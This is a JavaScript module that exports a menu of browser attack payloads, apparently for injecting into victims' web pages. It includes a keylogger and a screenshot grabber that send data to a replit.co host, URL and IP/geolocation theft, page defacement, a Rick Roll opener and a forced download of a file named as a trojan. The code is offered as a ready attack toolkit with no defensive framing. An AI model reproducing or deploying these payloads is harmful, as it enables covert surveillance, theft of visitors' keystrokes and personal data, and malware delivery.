const utils = [
  {
    name: "Key Strokes",
    description: "Track the keystrokes pressed by the user.",
    func: () => {
      let characters = [];
      function debounce(f, wait) {
        let timerId = null;
        return function (...args) {
          clearTimeout(timerId);
          timerId = setTimeout(() => f.apply(this, args), wait);
        }
      }

      const sendNewData = debounce(async (data) => {
        await sendData(data);
        characters = [];
      }, 1000)

      document.addEventListener("keypress", async (event) => {
        characters.push(event.key)
        sendNewData(characters.join(""));
      })
    }
  },



  {
    name: "Screenshot",
    description: "Screenshots the user's browser screen and saves it in your system.",
    func: () => {
      document.addEventListener('DOMContentLoaded', function () {
        // your code here
      }, false);

      html2canvas(document.body, {
        allowTaint: true,
        useCORS: true,
      })
        .then(async function (canvas) {
          // It will return a canvas element
          // DOMAIN
          const domain = "https://masti1.mausamvora.repl.co/";

          const blob = await (new Promise((resolve, reject) => {
            canvas.toBlob(file => {
              resolve(file)
            }, 'image/png')
          }));

          var form_data = new FormData();
          form_data.append("screenshot", blob, "ss.png");

          await fetch(`${domain}screenshots`, {
            method: 'POST', // or 'PUT'
            body: form_data,
          })
        })
        .catch((e) => {
          // Handle errors
          console.log(e);
        });
    }
  },



  {
    name: "Terror",
    description: "Erase page to show 'YOU ARE HACKED!!!'",
    func: () => {
      document.body.innerHTML = "<h1 style='color: red; font-size: 150px; text-align: center;'>YOU ARE HACKED!!!</h1>"
    }
  },



  {
    name: "Get URL",
    description: "Gets the URL of the page target visits",
    func: async () => {
      await sendData(window.location.href);
    }
  },


  {
    name: "Steal Data",
    description: "Intercepts network fetch requests and gets a copy of the data to the hacker",
    func: () => {

      self.addEventListener('fetch', function (event) {
        console.log(event);
      })

    }
  },



  {
    name: "Rick Roller",
    description: "Opens infinite Rick Rolls on youtube.",
    func: () => {
      window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley', '_blank');
    }
  },



  {
    name: "Steal Location & IP",
    description: "Steals accurate location, IP address and service provider.",
    func: async () => {
      const d = await fetch('https://ipapi.co/json/')
        .then(function (response) {
          return response.json();
        })

      await sendData(d);
    }
  },



  {
    name: "Inject file",
    description: "Download a malicious file in target's system.",
    func: () => {
      const link = document.createElement('a')
      const url = "https://draco.maalolan.repl.co/DrAcoTrOJaN_ti9x9ydcl63coiq.txt"
      link.href = url
      link.download = "DrAcoTrOJaN_ti9x9ydcl63coiq.txt"
      document.body.appendChild(link)
      link.click()
      document.body.removeChild(link)
    }
  }
]

module.exports = utils
